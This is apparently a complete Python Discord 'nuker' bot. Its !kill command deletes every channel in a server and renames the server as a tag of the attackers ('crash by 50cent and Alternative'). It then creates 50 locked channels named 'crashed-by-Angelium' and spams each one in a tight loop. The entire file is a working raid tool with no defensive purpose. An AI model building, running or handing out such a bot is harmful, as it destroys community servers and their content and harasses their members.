import discord
from discord.ext import commands
import asyncio
import os
from keep_alive import keep_alive
keep_alive()

PREFIX = "!"
TOKEN = os.getenv("DISCORD_TOKEN")
if not TOKEN:
    TOKEN = input("Bot Token -> ")

NEW_NAME = "crash by 50cent and Alternative"

def load_spam_text():
    if os.path.exists("spam.txt"):
        with open("spam.txt", "r", encoding="utf-8") as f:
            return f.read().strip()
    return "SPAM"

spam_text = load_spam_text()
spamming = False
created_channel_ids = []

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

async def spam_channel(channel):
    global spamming
    while spamming:
        try:
            await channel.send(spam_text)
            await asyncio.sleep(0.1)
        except:
            pass

async def delete_all_channels(guild):
    tasks = []
    for channel in guild.channels:
        tasks.append(asyncio.create_task(channel.delete()))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def kill(ctx):
    global spamming, created_channel_ids
    await ctx.message.delete()
    guild = ctx.guild
    await delete_all_channels(guild)
    try:
        await guild.edit(name=NEW_NAME)
    except:
        pass
    created_channel_ids.clear()
    spamming = True
    everyone_role = guild.default_role
    overwrites = {
        everyone_role: discord.PermissionOverwrite(
            view_channel=True,
            read_messages=True,
            send_messages=False
        )
    }
    tasks = []
    for i in range(50):
        task = asyncio.create_task(guild.create_text_channel(name="crashed-by-Angelium", overwrites=overwrites))
        tasks.append(task)
    channels = await asyncio.gather(*tasks, return_exceptions=True)
    for channel in channels:
        if isinstance(channel, discord.TextChannel):
            created_channel_ids.append(channel.id)
            asyncio.create_task(spam_channel(channel))

bot.run(TOKEN)